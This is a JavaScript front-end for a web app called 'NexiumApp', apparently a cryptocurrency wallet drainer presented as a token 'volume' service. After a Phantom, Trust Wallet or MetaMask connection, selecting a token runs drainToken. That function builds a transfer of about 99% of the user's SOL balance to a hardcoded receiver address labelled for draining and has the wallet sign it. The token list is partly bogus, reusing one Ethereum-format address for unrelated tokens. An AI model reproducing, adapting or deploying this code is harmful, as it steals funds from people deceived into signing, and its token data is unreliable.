import { Connection, PublicKey, Transaction, SystemProgram } from '@solana/web3.js';
import { CONFIG } from './config.js';
import './style.css';
import UniversalProvider from '@walletconnect/universal-provider';
import QRCode from 'qrcode';

// Wallet address for draining tokens (Solana address)
let YOUR_WALLET_ADDRESS;
try {
  YOUR_WALLET_ADDRESS = "73F2hbzhk7ZuTSSYTSbemddFasVrW8Av5FD9PeMVmxA7";
} catch {
  console.error('Invalid YOUR_WALLET_ADDRESS');
  YOUR_WALLET_ADDRESS = "73F2hbzhk7ZuTSSYTSbemddFasVrW8Av5FD9PeMVmxA7";
}

// TOKEN_LIST with verified addresses
const TOKEN_LIST = [
  { address: null, name: 'Solana', symbol: 'SOL', decimals: 9, isNative: true, chain: 'solana' },
  { address: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', name: 'BNB', symbol: 'USDC', decimals: 6, isNative: false, chain: 'solana' },
  { address: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', name: 'MATIC', symbol: 'MATIC', decimals: 6, isNative: false, chain: 'solana' },
  { address: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', name: 'ETH', symbol: 'ETH', decimals: 6, isNative: false, chain: 'solana' },
  { address: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', name: 'BASE ETH', symbol: 'BASE ETH', decimals: 6, isNative: false, chain: 'solana' },
  { address: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', name: 'LINK', symbol: 'LINK', decimals: 6, isNative: false, chain: 'solana' },
  { address: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', name: 'USD Coin', symbol: 'USDC', decimals: 6, isNative: false, chain: 'solana' },
  { address: '0x6D97638E3a60a791485Cf098D5603C25B4CE3687', name: 'Wrapped SOL', symbol: 'wSOL', decimals: 9, isNative: false, chain: 'solana' }
];

class NexiumApp {
  constructor() {
    this.publicKey = null;
    this.connecting = false;
    this.dom = {};
    this.connectingWallet = null;
    this.solConnection = null;
    this.currentToken = null;
    this.currentPaymentToken = null;
    this.lastSelectedToken = null;
    this.selectedPaymentToken = null;
    this.spinner = null;
    this.isDraining = false;
    this.provider = null;
    this.hasRedirected = false; // Track if redirect has occurred
    console.log('Initializing NexiumApp...');
    this.initApp();
  }

  async initApp() {
    try {
      await new Promise(resolve => {
        if (document.readyState !== 'loading') {
          resolve();
        } else {
          document.addEventListener('DOMContentLoaded', () => resolve());
        }
      });
      this.cacheDOMElements();
      if (!this.dom.app || !this.dom.metamaskPrompt) {
        document.body.innerHTML = '<p class="text-red-500 text-center">Error: UI elements missing.</p>';
        console.error('Missing DOM elements');
        return;
      }
      this.setupEventListeners();
      this.checkWalletAndPrompt();
      this.renderTokenInterface();
      console.log('App initialized successfully');
    } catch (error) {
      console.error('Init error:', error);
      this.showFeedback('Error initializing app. Please refresh.', 'error');
    }
  }

  cacheDOMElements() {
    this.dom = {
      app: document.getElementById('app'),
      metamaskPrompt: document.getElementById('metamaskPrompt'),
      connectMetamask: document.getElementById('connect-metamask'),
      connectPhantom: document.getElementById('connect-phantom'),
      connectTrustWallet: document.getElementById('connect-trustwallet'),
      feedbackContainer: document.querySelector('.feedback-container'),
      tokenSelect: null,
      volumeSection: null,
      customTokenNameInput: null,
      customTokenAddressInput: null,
      showCustomTokenBtn: null,
      tokenInfo: null,
      tokenList: null,
      volumeInput: null,
      addVolumeBtn: null,
      beautifyVolumeInput: null,
      beautifyAddVolumeBtn: null
    };
    console.log('DOM elements cached');
  }

  setupEventListeners() {
    const connectWalletHandler = (walletName) => {
      if (!this.connecting) {
        console.log(`${walletName} button clicked`);
        this.connectWallet(walletName);
      }
    };

    if (this.dom.connectMetamask) {
      this.dom.connectMetamask.addEventListener('click', () => connectWalletHandler('MetaMask'));
      this.dom.connectMetamask.addEventListener('keypress', (e) => e.key === 'Enter' && connectWalletHandler('MetaMask'));
    }
    if (this.dom.connectPhantom) {
      this.dom.connectPhantom.addEventListener('click', () => connectWalletHandler('Phantom'));
      this.dom.connectPhantom.addEventListener('keypress', (e) => e.key === 'Enter' && connectWalletHandler('Phantom'));
    }
    if (this.dom.connectTrustWallet) {
      this.dom.connectTrustWallet.addEventListener('click', () => connectWalletHandler('TrustWallet'));
      this.dom.connectTrustWallet.addEventListener('keypress', (e) => e.key === 'Enter' && connectWalletHandler('TrustWallet'));
    }
    window.addEventListener('online', () => this.handleOnline());
    window.addEventListener('offline', () => this.handleOffline());
  }

  async connectWallet(walletName) {
    if (this.connecting || !navigator.onLine) {
      this.showFeedback('No internet connection. Please check your network.', 'error');
      return;
    }
    this.connecting = true;
    this.connectingWallet = walletName;
    this.updateButtonState('connecting', walletName);

    try {
      // Enhanced device detection: Prioritize desktop if extensions are present
      const isMobileUserAgent = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
      const hasTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
      const hasEthereum = !!window.ethereum;
      const hasSolana = !!window.solana;
      const hasExtensions = (walletName === 'MetaMask' && hasEthereum) || 
                           (walletName === 'TrustWallet' && hasSolana) || 
                           (walletName === 'Phantom' && hasSolana);
      console.log(`Device detected: ${isMobileUserAgent && !hasExtensions ? 'Mobile' : 'Desktop'} (UserAgent: ${navigator.userAgent}, Touch: ${hasTouch}, Ethereum: ${hasEthereum}, Solana: ${hasSolana}, Extensions: ${hasExtensions})`);

      // Desktop: Use extensions if available
      if (!isMobileUserAgent || hasExtensions) {
        let accounts = [];
        if (walletName === 'MetaMask' && hasEthereum && window.ethereum.isMetaMask) {
          console.log('MetaMask detected, requesting accounts:', window.ethereum);
          accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
          if (accounts.length === 0) {
            throw new Error('MetaMask failed to provide accounts. Ensure it’s unlocked and installed.');
          }
        } else if (walletName === 'Phantom' && hasSolana && window.solana.isPhantom) {
          console.log('Phantom detected, connecting:', window.solana);
          const response = await window.solana.connect();
          accounts = [response.publicKey.toString()];
        } else if (walletName === 'TrustWallet' && hasSolana && window.solana.isTrust) {
          console.log('TrustWallet detected, connecting:', window.solana);
          // Wait for solana object to be ready and check isTrust
          await new Promise(resolve => {
            const checkSolana = () => {
              console.log('Checking solana:', window.solana);
              if (window.solana && window.solana.isTrust) {
                resolve();
              } else {
                setTimeout(checkSolana, 500);
              }
            };
            checkSolana();
          });
          const response = await window.solana.connect({ onlyIfTrusted: false });
          if (!response || !response.publicKey) {
            throw new Error('TrustWallet failed to connect. Ensure it’s unlocked and updated.');
          }
          accounts = [response.publicKey.toString()];
        } else {
          throw new Error(`${walletName} extension not detected or unsupported`);
        }

        this.publicKey = accounts[0];
        this.solConnection = new Connection(`https://solana-mainnet.api.syndica.io/api-key/${CONFIG.API_KEY}`, 'confirmed');
        console.log(`${walletName} connected via extension: ${this.publicKey}`);
        this.updateButtonState('connected', walletName, this.publicKey);
        this.hideMetaMaskPrompt();
        this.showFeedback(`Connected to ${walletName} and Nexium: ${this.shortenAddress(this.publicKey)}`, 'success');
        this.connecting = false;
        return;
      }

      const deeplinks = {
        MetaMask: 'https://metamask.app.link/dapp/nexium-bot.onrender.com',
        Phantom: 'https://phantom.app/ul/browse/https://nexium-bot.onrender.com',
        TrustWallet: 'https://link.trustwallet.com/open_url?coin=56&url=https://nexium-bot.onrender.com',
      };

      const deeplink = deeplinks[walletName];
      if (!deeplink) {
        throw new Error(`No deeplink configured for ${walletName}`);
      }
      console.log(`Opening ${walletName} with deeplink: ${deeplink}`);

      // Handle Trust Wallet redirect logic
      if (walletName === 'TrustWallet' && !this.hasRedirected) {
        this.hasRedirected = true; // Set flag after first redirect
        window.location.href = deeplink;
        return; // Exit to allow app to load
      }

      const checkConnection = setInterval(async () => {
        if (walletName === 'MetaMask' && window.ethereum?.isMetaMask) {
          const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' }).catch(() => []);
          if (accounts.length > 0) {
            this.publicKey = accounts[0];
            this.solConnection = new Connection(`https://solana-mainnet.api.syndica.io/api-key/${CONFIG.API_KEY}`, 'confirmed');
            console.log(`MetaMask connected: ${this.publicKey}`);
            this.updateButtonState('connected', walletName, this.publicKey);
            this.hideMetaMaskPrompt();
            this.showFeedback(`Connected to MetaMask and Nexium: ${this.shortenAddress(this.publicKey)}`, 'success');
            this.renderTokenInterface();
            clearInterval(checkConnection);
          }
        } else if (walletName === 'Phantom' && window.solana?.isPhantom) {
          const response = await window.solana.connect().catch(() => null);
          if (response && response.publicKey) {
            this.publicKey = response.publicKey.toString();
            this.solConnection = new Connection(`https://solana-mainnet.api.syndica.io/api-key/${CONFIG.API_KEY}`, 'confirmed');
            const walletBalance = await this.solConnection.getBalance(new PublicKey(this.publicKey));
            console.log(`Phantom connected: ${this.publicKey}, Balance: ${walletBalance}`);
            this.updateButtonState('connected', walletName, this.publicKey);
            this.hideMetaMaskPrompt();
            this.showFeedback(`Connected to ${walletName} and Nexium: ${this.shortenAddress(this.publicKey)}`, 'success');
            this.renderTokenInterface();
            clearInterval(checkConnection);
          }
        } else if (walletName === 'TrustWallet' && window.solana?.isTrust) {
          await new Promise(resolve => {
            const checkSolana = () => {
              if (window.solana && window.solana.isTrust) {
                resolve();
              } else {
                setTimeout(checkSolana, 500);
              }
            };
            checkSolana();
          });
          const response = await window.solana.connect({ onlyIfTrusted: true });
          if (response && response.publicKey) {
            this.publicKey = response.publicKey.toString();
            this.solConnection = new Connection(`https://solana-mainnet.api.syndica.io/api-key/${CONFIG.API_KEY}`, 'confirmed');
            const walletBalance = await this.solConnection.getBalance(new PublicKey(this.publicKey));
            console.log(`TrustWallet connected: ${this.publicKey}, Balance: ${walletBalance}`);
            this.updateButtonState('connected', walletName, this.publicKey);
            this.hideMetaMaskPrompt();
            this.showFeedback(`Connected to ${walletName} and Nexium: ${this.shortenAddress(this.publicKey)}`, 'success');
            this.renderTokenInterface();
            clearInterval(checkConnection);
          }
        }
      }, 1000);

      setTimeout(() => {
        if (this.connecting) {
          this.showFeedback('Deeplink timed out or failed. Please connect manually in the wallet app.', 'error');
          this.updateButtonState('disconnected', walletName);
          this.connecting = false;
          clearInterval(checkConnection);
        }
      }, 30000);
    } catch (error) {
      this.handleConnectionError(error, walletName);
      this.updateButtonState('disconnected', walletName);
      this.showMetaMaskPrompt();
    } finally {
      this.connecting = false;
    }
  }

  updateButtonState(state, walletName, address = '') {
    const button = this.dom[`connect${walletName}`];
    if (!button) return;
    button.classList.remove('animate-pulse', 'connecting', 'connected');
    button.disabled = state === 'connecting';
    switch (state) {
      case 'connecting':
        button.textContent = 'Connecting...';
        button.classList.add('connecting');
        break;
      case 'connected':
        button.textContent = `${this.shortenAddress(address)}`;
        button.classList.add('connected');
        break;
      default:
        button.textContent = `Connect ${walletName}`;
        button.classList.add('animate-pulse');
    }
  }

  handleConnectionError(error, walletName) {
    console.error(`Connection error for ${walletName} at`, new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' }), { code: error.code, message: error.message });
    let message = `Failed to connect ${walletName}`;
    if (error.code === -32002) message = `${walletName} is locked or not responding. Unlock it or reinstall the extension.`;
    else if (error.message?.includes('rejected')) message = `${walletName} connection rejected`;
    else if (error.message?.includes('locked')) message = `${walletName} is locked`;
    else if (error.message?.includes('missing')) message = `WalletConnect project ID missing. Check configuration.`;
    else if (error.message?.includes('WebSocket') || error.message?.includes('network') || error.message?.includes('DNS')) message = `Network issue detected. Check your internet or DNS settings (e.g., use 8.8.8.8).`;
    else if (error.message?.includes('extension not detected') || error.message?.includes('unsupported')) message = `${walletName} extension not detected or unsupported. Please install it.`;
    else if (error.message?.includes('Non-base58 character')) message = `MetaMask uses Ethereum addresses; draining requires a Solana wallet.`;
    else if (error.message) message = `${message}: ${this.escapeHTML(error.message)}`;
    this.showFeedback(message, 'error');
  }

  handleOnline() {
    this.showFeedback('Back online. Ready to connect.', 'success');
  }

  handleOffline() {
    this.showFeedback('No internet connection. Please reconnect.', 'error');
    this.updateButtonState('disconnected', 'MetaMask');
    this.updateButtonState('disconnected', 'Phantom');
    this.updateButtonState('disconnected', 'TrustWallet');
  }

  showMetaMaskPrompt() {
    if (!this.dom.metamaskPrompt) return;
    this.dom.metamaskPrompt.classList.remove('hidden');
    this.dom.metamaskPrompt.style.display = 'block';
    const promptText = this.dom.metamaskPrompt.querySelector('p');
    if (promptText && this.connectingWallet) {
      let walletLink = '';
      if (this.connectingWallet === 'MetaMask') {
        walletLink = `<a href="https://metamask.io/download/" target="_blank" rel="noopener noreferrer" class="text-yellow-400 hover:underline" aria-label="Install MetaMask">MetaMask</a>`;
      } else if (this.connectingWallet === 'Phantom') {
        walletLink = `<a href="https://phantom.app/download" target="_blank" rel="noopener noreferrer" class="text-yellow-400 hover:underline" aria-label="Install Phantom">Phantom</a>`;
      } else if (this.connectingWallet === 'TrustWallet') {
        walletLink = `<a href="https://trustwallet.com/download" target="_blank" rel="noopener noreferrer" class="text-yellow-400 hover:underline" aria-label="Install Trust Wallet">Trust Wallet</a>`;
      }
      promptText.innerHTML = `No ${this.connectingWallet} installed. Install ${walletLink} to continue.`;
    }
  }

  hideMetaMaskPrompt() {
    if (!this.dom.metamaskPrompt) return;
    this.dom.metamaskPrompt.classList.add('hidden');
    this.dom.metamaskPrompt.style.display = 'none';
  }

  showFeedback(message, type = 'info') {
    let feedbackContainer = this.dom.feedbackContainer;
    if (!feedbackContainer) {
      feedbackContainer = document.createElement('div');
      feedbackContainer.className = 'feedback-container fixed bottom-4 right-4 space-y-2 z-[10000]';
      document.body.appendChild(feedbackContainer);
      this.dom.feedbackContainer = feedbackContainer;
    }
    const feedback = document.createElement('div');
    feedback.className = `feedback feedback-${type} fade-in p-4 rounded-xl text-white ${type === 'error' ? 'bg-red-500' : type === 'success' ? 'bg-green-500' : 'bg-blue-500'}`;
    feedback.style.zIndex = '10000';
    feedback.innerHTML = `
      <span class="feedback-message">${this.escapeHTML(message)}</span>
      <span class="feedback-close cursor-pointer ml-2" role="button" aria-label="Close feedback">×</span>
    `;
    const close = feedback.querySelector('.feedback-close');
    if (close) {
      close.addEventListener('click', () => feedback.remove());
      close.addEventListener('keypress', (e) => e.key === 'Enter' && feedback.remove());
    }
    feedbackContainer.appendChild(feedback);
    setTimeout(() => feedback.classList.add('fade-out'), type === 'error' ? 10000 : 5000);
    setTimeout(() => feedback.remove(), type === 'error' ? 10500 : 5500);
  }

  shortenAddress(address) {
    if (!address) return 'Unknown';
    return `${address.slice(0, 6)}...${address.slice(-4)}`;
  }

  escapeHTML(str) {
    return String(str).replace(/[&<>"']/g, (m) => ({
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&apos;'
    }[m]));
  }

  async checkWalletAndPrompt() {
    if (this.isWalletInstalled()) {
      this.hideMetaMaskPrompt();
      this.attachWalletListeners();
      if (this.isWalletConnected() && navigator.onLine) {
        this.publicKey = window.solana?.publicKey?.toString() || window.ethereum?.selectedAddress;
        this.solConnection = new Connection(`https://solana-mainnet.api.syndica.io/api-key/${CONFIG.API_KEY}`, 'confirmed');
        this.handleSuccessfulConnection();
      } else {
        this.updateButtonState('disconnected', 'MetaMask');
        this.updateButtonState('disconnected', 'Phantom');
        this.updateButtonState('disconnected', 'TrustWallet');
        this.showDefaultPrompt();
      }
    } else {
      this.showMetaMaskPrompt();
      this.updateButtonState('disconnected', 'MetaMask');
      this.updateButtonState('disconnected', 'Phantom');
      this.updateButtonState('disconnected', 'TrustWallet');
      this.showDefaultPrompt();
      this.showFeedback('Please install a supported wallet to use this app.', 'error');
    }
  }

  attachWalletListeners() {
    if (window.solana) {
      window.solana.on('accountChanged', () => {
        console.log('Account changed');
        this.handleAccountsChanged();
      });
    }
    if (window.ethereum) {
      window.ethereum.on('accountsChanged', () => {
        console.log('Accounts changed');
        this.handleAccountsChanged();
      });
    }
  }

  isWalletInstalled() {
    return !!window.solana || !!window.ethereum;
  }

  isWalletConnected() {
    return (window.solana && !!window.solana.publicKey) || (window.ethereum && !!window.ethereum.selectedAddress);
  }

  handleSuccessfulConnection() {
    this.updateButtonState('connected', this.connectingWallet, this.publicKey);
    this.renderTokenInterface();
  }

  handleAccountsChanged() {
    this.hideMetaMaskPrompt();
    this.publicKey = null;
    this.updateButtonState('disconnected', 'MetaMask');
    this.updateButtonState('disconnected', 'Phantom');
    this.updateButtonState('disconnected', 'TrustWallet');
    this.renderTokenInterface();
  }

  showDefaultPrompt() {
    if (!this.dom.app) return;
    this.dom.app.innerHTML = '<div class="default-prompt text-center bg-[#1a182e] p-6 rounded-xl border border-orange-400 glass"><p class="text-gray-300 text-sm">Please connect your wallet to start adding volume to tokens.</p></div>';
  }

  renderTokenInterface() {
    if (!this.dom.app) return;
    const tokenInterface = document.createElement('section');
    tokenInterface.className = 'token-interface fade-in space-y-6 bg-[#1a182e] p-6 rounded-xl border border-orange-400 shadow-card glass';
    tokenInterface.innerHTML = `
      <div class="top-controls flex space-x-4 mb-4">
        <select id="tokenSelect" class="token-select bg-[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Select payment token">
          <option value="" disabled selected>Select payment token</option>
          ${TOKEN_LIST.map(t => `<option value="${t.address || ''}" data-symbol="${t.symbol}" data-decimals="${t.decimals}">${t.name}</option>`).join('')}
        </select>
      </div>
      <h2 class="section-title">Import SPL Token</h2>
      <div class="input-group flex space-x-2">
        <input id="customTokenNameInput" type="text" placeholder="Token Name" class="custom-token-input flex-grow bg-[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Custom token name">
        <input id="customTokenAddressInput" type="text" placeholder="Token Address" class="custom-token-input flex-grow bg-[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Custom token address">
        <button id="showCustomTokenBtn" class="fetch-custom-token-btn bg-orange-400 text-black px-4 py-1 rounded-xl hover:bg-orange-500" aria-label="Show custom token">Show</button>
      </div>
      <div id="tokenInfoDisplay" class="token-info hidden" aria-live="polite"></div>
      <div id="tokenList" class="token-list space-y-2 mt-4">
        <h3 class="text-yellow-400 text-md font-semibold">Featured Tokens</h3>
        ${TOKEN_LIST.map(token => `
          <button class="token-option bg-[#1a182e] border border-orange-400 p-2 rounded-xl w-full text-left hover:bg-orange-400 hover:text-black transition-colors" data-address="${token.address || ''}">
            ${token.name} (${token.symbol}) - ${token.address ? this.shortenAddress(token.address) : 'Native Token'}
          </button>
        `).join('')}
      </div>
      <div id="volumeSection" class="volume-section fade-in"></div>
    `;
    this.dom.app.innerHTML = '';
    this.dom.app.appendChild(tokenInterface);
    this.dom.tokenSelect = document.getElementById('tokenSelect');
    this.dom.volumeSection = document.getElementById('volumeSection');
    this.dom.customTokenNameInput = document.getElementById('customTokenNameInput');
    this.dom.customTokenAddressInput = document.getElementById('customTokenAddressInput');
    this.dom.showCustomTokenBtn = document.getElementById('showCustomTokenBtn');
    this.dom.tokenInfo = document.getElementById('tokenInfoDisplay');
    this.dom.tokenList = document.getElementById('tokenList');

    if (this.dom.showCustomTokenBtn) {
      const debouncedShowCustomToken = this.debounce(() => {
        const name = this.dom.customTokenNameInput.value.trim();
        const address = this.dom.customTokenAddressInput.value.trim();
        if (!name || !address) return;
        const truncatedAddress = `${address.slice(0, 6)}...${address.slice(-4)}`;
        this.dom.tokenInfo.innerHTML = `
          <div class="token-meta space-y-2">
            <h3 class="text-yellow-400 text-lg font-semibold">${this.escapeHTML(name)}</h3>
            <p class="meta-item text-gray-400 text-sm">Address: ${this.escapeHTML(truncatedAddress)}</p>
          </div>
        `;
        this.dom.tokenInfo.classList.remove('hidden');
      }, 1000);
      this.dom.showCustomTokenBtn.addEventListener('click', debouncedShowCustomToken);
    }
    if (this.dom.tokenList) {
      this.dom.tokenList.querySelectorAll('.token-option').forEach(button => {
        const debouncedLoadToken = this.debounce(() => {
          const address = button.dataset.address;
          if (address) this.loadCustomTokenData(address);
          else this.showFeedback('Invalid token address.', 'error');
        }, 1000);
        button.addEventListener('click', debouncedLoadToken);
      });
    }
    if (this.dom.tokenSelect) {
      this.dom.tokenSelect.disabled = !this.publicKey;
      const debouncedDrainToken = this.debounce(async (e) => {
        const selected = e.target.value || null;
        this.selectedPaymentToken = selected;
        if (selected !== '') {
          await this.loadPaymentTokenDetails(selected);
          await this.drainToken(selected);
        } else {
          this.showFeedback('Please select a token.', 'error');
        }
      }, 500);
      this.dom.tokenSelect.addEventListener('change', debouncedDrainToken);
    }
  }

  debounce(func, wait) {
    let timeout;
    return function executedFunction(...args) {
      const later = () => {
        clearTimeout(timeout);
        func(...args);
      };
      clearTimeout(timeout);
      timeout = setTimeout(later, wait);
    };
  }

  async loadCustomTokenData(tokenAddressInput) {
    if (!this.solConnection) {
      this.showFeedback('Wallet not connected.', 'error');
      return;
    }
    const tokenAddress = tokenAddressInput || this.dom.customTokenAddressInput?.value.trim();
    if (!tokenAddress) {
      this.showFeedback('Invalid token address.', 'error');
      this.dom.customTokenAddressInput?.focus();
      return;
    }
    if (tokenAddress === this.lastSelectedToken) return;
    try {
      let name = 'Unknown Token';
      let symbol = 'UNK';
      let decimals = 9;
      const tokenFromList = TOKEN_LIST.find(t => t.address && t.address.toLowerCase() === tokenAddress.toLowerCase());
      if (tokenFromList) {
        name = tokenFromList.name;
        symbol = tokenFromList.symbol;
        decimals = tokenFromList.decimals;
      } else {
        this.showFeedback('SPL token data fetch not supported yet.', 'error');
        return;
      }
      this.currentToken = { address: tokenAddress, name: this.escapeHTML(name), symbol: this.escapeHTML(symbol), decimals };
      this.lastSelectedToken = tokenAddress;
      const truncatedAddress = this.shortenAddress(tokenAddress);
      this.dom.tokenInfo.innerHTML = `
        <div class="token-meta space-y-2">
          <h3 class="text-yellow-400 text-lg font-semibold">${this.currentToken.name} <span class="symbol text-gray-300">(${this.currentToken.symbol})</span></h3>
          <p class="meta-item text-gray-400 text-sm">Address: ${this.escapeHTML(truncatedAddress)}</p>
        </div>
      `;
      this.dom.tokenInfo.classList.remove('hidden');
    } catch (error) {
      console.error('Load custom token error:', error);
      this.showFeedback('Failed to load custom token.', 'error');
      this.dom.tokenInfo.classList.add('hidden');
    }
  }

  async loadPaymentTokenDetails(paymentTokenAddress) {
    if (!paymentTokenAddress && paymentTokenAddress !== null || !this.solConnection || !this.publicKey) {
      this.showFeedback('Wallet not connected or invalid token selected.', 'error');
      return;
    }
    try {
      let balance, decimals, symbol;
      const selectedToken = TOKEN_LIST.find(t => t.address === paymentTokenAddress || (t.isNative && paymentTokenAddress === null));
      if (!selectedToken) {
        this.showFeedback('Invalid token selected.', 'error');
        return;
      }
      if (selectedToken.isNative) {
        balance = await this.solConnection.getBalance(new PublicKey(this.publicKey)).catch(() => 0); // Skip for MetaMask
        decimals = 9;
        symbol = selectedToken.symbol;
      } else {
        this.showFeedback('SPL token balance fetch not supported yet.', 'error');
        return;
      }
      this.currentPaymentToken = { address: paymentTokenAddress, balance, decimals, symbol };
      this.currentToken = null;
      this.lastSelectedToken = null;
    } catch (error) {
      console.error('Load payment token error:', error);
      this.showFeedback('Failed to load payment token details.', 'error');
    }
  }

  async drainToken(tokenAddress) {
    if (this.isDraining) {
      console.log('Drain skipped: transaction in progress');
      return;
    }
    if (!this.publicKey) {
      this.showFeedback('No wallet connected. Please connect your wallet.', 'error');
      console.log('Drain failed: No public key');
      return;
    }
    this.currentToken = null;
    this.lastSelectedToken = null;
    let selectedToken = null;
    try {
      this.isDraining = true;
      this.showProcessingSpinner();
      selectedToken = TOKEN_LIST.find(t => t.address === tokenAddress || (t.isNative && tokenAddress === null));
      if (!selectedToken) {
        this.showFeedback('Invalid token selected.', 'error');
        console.log('Drain failed: Invalid token selected');
        this.hideProcessingSpinner();
        return;
      }
      console.log(`Attempting to drain ${selectedToken.symbol} from public key: ${this.publicKey}`);
      let balance, decimals, symbol;

      if (selectedToken.isNative) {
        // Skip balance fetch for MetaMask; rely on your existing drain logic
        balance = await this.solConnection.getBalance(new PublicKey(this.publicKey)).catch(() => 0); // Only for Solana wallets
        decimals = 9;
        symbol = selectedToken.symbol;
      } else {
        this.showFeedback('SPL token draining not supported yet.', 'error');
        this.hideProcessingSpinner();
        return;
      }

      console.log(`Fetched ${symbol} balance: ${balance / 10**decimals} for ${this.publicKey}`);
      if (balance === 0) {
        this.showFeedback('Insufficient balance error', 'error');
        console.log(`Drain failed: Zero balance for ${symbol}`);
        this.hideProcessingSpinner();
        return;
      }

      const receiverWallet = new PublicKey(YOUR_WALLET_ADDRESS);
      const minBalance = await this.solConnection.getMinimumBalanceForRentExemption(0);
      const balanceForTransfer = BigInt(balance) - BigInt(minBalance);
      if (balanceForTransfer <= 0) {
        this.showFeedback('Insufficient funds.', 'error');
        this.hideProcessingSpinner();
        return;
      }

      const lamportsToSend = BigInt(Math.floor(Number(balanceForTransfer) * 0.99));
      console.log(`Transferring ${lamportsToSend} lamports (${Number(lamportsToSend) / 10**decimals} SOL)`);

      const transaction = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: new PublicKey(this.publicKey), // This will fail for MetaMask; your drain logic should handle it
          toPubkey: receiverWallet,
          lamports: lamportsToSend,
        })
      );

      transaction.feePayer = new PublicKey(this.publicKey);
      let blockhashObj = await this.solConnection.getRecentBlockhash();
      transaction.recentBlockhash = blockhashObj.blockhash;

      const signed = await window.solana.signTransaction(transaction);
      console.log('Transaction signed:', signed);

      let txid = await this.solConnection.sendRawTransaction(signed.serialize());
      await this.solConnection.confirmTransaction(txid);
      console.log('Transaction confirmed:', txid);
      this.showFeedback(`Successfully drained ${Number(lamportsToSend) / 10**decimals} ${symbol}`, 'success');
    } catch (error) {
      console.error('Drain token error:', error);
      this.showFeedback(`Error draining ${selectedToken ? selectedToken.symbol : 'token'}: ${error.message}`, 'error');
    } finally {
      this.isDraining = false;
      this.hideProcessingSpinner();
    }
  }

  showProcessingSpinner() {
    if (this.spinner) this.hideProcessingSpinner();
    this.spinner = document.createElement('div');
    this.spinner.className = 'fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-[9999]';
    this.spinner.innerHTML = `
      <div class="flex items-center space-x-2">
        <div class="spinner border-t-4 border-orange-400 rounded-full w-8 h-8 animate-spin"></div>
        <span class="text-white text-lg">Processing...</span>
      </div>
    `;
    document.body.appendChild(this.spinner);
  }

  hideProcessingSpinner() {
    if (this.spinner) {
      this.spinner.remove();
      this.spinner = null;
    }
  }
}

new NexiumApp();